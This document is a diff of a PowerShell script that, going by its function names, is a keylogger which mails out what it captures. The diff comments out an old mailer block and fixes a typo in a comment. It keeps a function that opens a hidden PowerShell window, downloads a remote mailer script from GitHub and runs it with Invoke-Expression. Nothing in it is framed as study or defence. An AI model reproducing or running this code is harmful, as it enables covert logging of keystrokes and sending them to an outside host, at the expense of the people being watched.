@@ -387,6 +387,8 @@ function findGeoLocation(){
 ### ATTENTION THIS SCRIPT BLOCK IS KILLED IF PARRENT EXITS!!!!!
 ### TODO USE Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList notepad.exe TO MAKE IT INDEPENDABLE 
 ### https://stackoverflow.com/questions/8515359/how-can-i-start-a-background-job-in-powershell-that-outlives-its-parent
+### QUARANTINED to be deleted in the following phase
+<#
 function createMailerToMailKeyloggerResults(){
 	$variableContainingScriptToBeExecutedAsString = '
 function mail($messageBody){
@@ -478,8 +480,9 @@ function mail($messageBody){
 	$results += "`n"
 	$results
 }
+#>
 
-#Spitted mailer and ported the mailer script to github
+#Splitted mailer and ported the mailer script to github
 function createNewMailer(){
 powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/mailer.ps1')"
 }
